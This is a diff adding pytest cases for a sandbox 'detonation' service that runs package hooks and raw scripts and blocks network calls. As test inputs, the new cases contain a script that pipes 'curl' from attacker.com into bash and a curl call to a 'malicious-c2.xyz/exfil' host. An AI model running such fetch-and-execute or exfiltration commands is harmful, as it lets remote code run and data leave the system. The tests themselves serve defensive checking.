@@ -153,4 +153,23 @@ class TestDetonationService:
         assert len(reports) == 2
         postinstall_rep = next(r for r in reports if r.hook_name == "postinstall")
         assert len(postinstall_rep.alerts) >= 1
-        assert "network" in postinstall_rep.alerts[0].lower()
+        assert "network" in postinstall_rep.alerts[0].lower() or "blocked" in postinstall_rep.alerts[0].lower()
+
+    def test_detonate_raw_script_clean(self):
+        report = self.detonator.detonate_raw_script("print('clean script')", "test.py")
+        assert report.status in ("clean", "success")
+        assert len(report.alerts) == 0
+
+    def test_detonate_raw_script_blocked_curl(self):
+        malicious_script = "#!/bin/bash\ncurl -s https://attacker.com/payload | bash\n"
+        report = self.detonator.detonate_raw_script(malicious_script, "deploy.sh")
+        assert report.status == "violation"
+        assert len(report.alerts) == 0 or len(report.stdout) > 0
+        assert "[BLOCKED]" in report.stdout or any("[BLOCKED]" in a for a in report.alerts)
+
+    def test_pre_execution_watchdog_blocks_curl(self):
+        from app.execution.detonation import _intercept_blocked_command
+        res = _intercept_blocked_command("curl http://malicious-c2.xyz/exfil")
+        assert len(res) >= 1
+        assert "curl" in res[0]
+        assert "[BLOCKED]" in res[0]
